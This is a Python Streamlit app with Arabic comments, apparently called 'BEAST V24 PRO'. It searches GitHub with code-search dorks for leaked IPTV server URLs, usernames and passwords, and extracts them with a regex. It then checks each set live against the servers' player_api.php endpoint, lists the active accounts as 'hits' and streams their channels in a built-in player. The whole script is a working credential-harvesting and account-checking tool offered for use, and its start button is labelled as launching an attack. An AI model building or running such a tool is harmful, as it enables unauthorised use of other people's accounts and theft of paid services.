import streamlit as st
import requests
import re
import time
from datetime import datetime

# --- إعدادات الصفحة ---
st.set_page_config(page_title="BEAST V24 PRO - LIVE SEARCH", layout="wide", initial_sidebar_state="expanded")

# --- نظام الدخول ---
if "auth" not in st.session_state:
    st.session_state.auth = False
if "current_server" not in st.session_state:
    st.session_state.current_server = None

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V24 - ULTIMATE</h1>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,2,1])
    with col2:
        pwd = st.text_input("Password:", type="password")
        if st.button("دخول للنظام"):
            if pwd == "BEAST_V17_PRO":
                st.session_state.auth = True
                st.rerun()
            else:
                st.error("كلمة المرور غير صحيحة")
    st.stop()

# --- التنسيقات (CSS) ---
st.markdown("""
<style>
    .stApp { background-color: #050505; }
    .active-hit { 
        background: #0d1117; border: 1px solid #00ff41; 
        padding: 15px; border-radius: 8px; margin-bottom: 10px;
    }
    .text-green { color: #00ff41; font-weight: bold; font-size: 18px; }
    .text-yellow { color: #fbbf24; font-family: monospace; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; }
    .channel-card {
        background: #1a1a1a; padding: 10px; border-radius: 5px;
        text-align: center; border: 1px solid #333; cursor: pointer;
    }
</style>
""", unsafe_allow_html=True)

# --- وظائف المشغل المدمج ---
def show_player(host, user, pw):
    st.sidebar.button("⬅️ العودة للبحث", on_click=lambda: st.session_state.update({"current_server": None}))
    st.title("📺 مشغل القنوات الذكي")
    st.info(f"المصدر: {host} | المستخدم: {user}")
    
    try:
        # جلب البيانات من API السيرفر
        api_url = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_streams"
        response = requests.get(api_url, timeout=5).json()
        
        if response:
            search_ch = st.text_input("🔍 ابحث عن قناة...")
            cols = st.columns(4)
            for idx, ch in enumerate(response):
                name = ch.get('name', 'Unknown')
                stream_id = ch.get('stream_id')
                ext = ch.get('container_extension', 'm3u8')
                
                if search_ch.lower() in name.lower():
                    with cols[idx % 4]:
                        stream_url = f"{host}/live/{user}/{pw}/{stream_id}.{ext}"
                        if st.button(f"▶️ {name[:20]}", key=f"ch_{stream_id}"):
                            st.subheader(f"جاري تشغيل: {name}")
                            # تضمين مشغل Video.js يدعم HLS
                            st.components.v1.html(f"""
                                <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet" />
                                <video id="my-video" class="video-js vjs-big-play-centered" controls preload="auto" width="100%" height="400" data-setup='{"fluid": true}'>
                                    <source src="{stream_url}" type="application/x-mpegURL">
                                </video>
                                <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
                            """, height=450)
        else:
            st.warning("لم يتم العثور على قنوات في هذا السيرفر.")
    except Exception as e:
        st.error(f"خطأ في الاتصال بالسيرفر: {e}")

# --- محرك البحث والفحص ---
if st.session_state.current_server:
    # عرض المشغل إذا تم اختيار سيرفر
    s = st.session_state.current_server
    show_player(s['host'], s['user'], s['pw'])
else:
    # واجهة البحث الرئيسية
    with st.sidebar:
        st.title("⚡ BEAST V24")
        token = st.text_input("GitHub Token:", type="password", help="ضع توكن جيت هاب لزيادة سرعة البحث")
        pages = st.slider("عدد صفحات البحث لكل دروك", 1, 100, 10)
        start = st.button("🚀 بدء الهجوم الشامل")
        st.divider()
        if st.button("🗑️ مسح النتائج"):
            st.session_state.hits = []

    st.subheader("📡 رادار النتائج الحية")
    radar_area = st.empty()
    hits_area = st.container()

    if start and token:
        headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
        # توسيع الدروكات لتشمل أنماط أكثر
        dorks = [
            'extension:txt "get.php?username=" "password="',
            'extension:m3u "player_api.php"',
            'extension:php "panel_api.php" username password',
            'extension:txt "http://" "username=" "password=" "port"',
            '"/player_api.php?username=" password extension:php'
        ]
        
        found_count = 0
        for dork in dorks:
            for page in range(1, pages + 1):
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
                    res = requests.get(search_url, headers=headers).json()
                    
                    if "items" not in res:
                        radar_area.warning(f"Rate Limit! انتظار 10 ثوانٍ... (صفحة {page})")
                        time.sleep(10)
                        continue

                    for item in res['items']:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        try:
                            content = requests.get(raw_url, timeout=3).text
                            # استخراج السيرفر واليوزر والباسورد
                            matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                            
                            for m in matches:
                                host, user, pw = m[0], m[1], m[2]
                                radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host}...</p>", unsafe_allow_html=True)
                                
                                try:
                                    # الفحص المباشر للسيرفر
                                    check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                    r = requests.get(check_url, timeout=2).json()
                                    
                                    if r.get("user_info", {}).get("status") == "Active":
                                        found_count += 1
                                        with hits_area:
                                            with st.container():
                                                st.markdown(f"""
                                                <div class="active-hit">
                                                    <span class="text-green">✅ HIT #{found_count} - ACTIVE</span><br>
                                                    <span class="text-white">URL: {host}</span><br>
                                                    <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                                </div>
                                                """, unsafe_allow_html=True)
                                                # زر الدخول المباشر للمشغل
                                                if st.button(f"📺 فتح مشغل {user}", key=f"btn_{host}_{user}"):
                                                    st.session_state.current_server = {"host": host, "user": user, "pw": pw}
                                                    st.rerun()
                                except: continue
                        except: continue
                    time.sleep(1) # لتجنب الحظر السريع
                except: continue
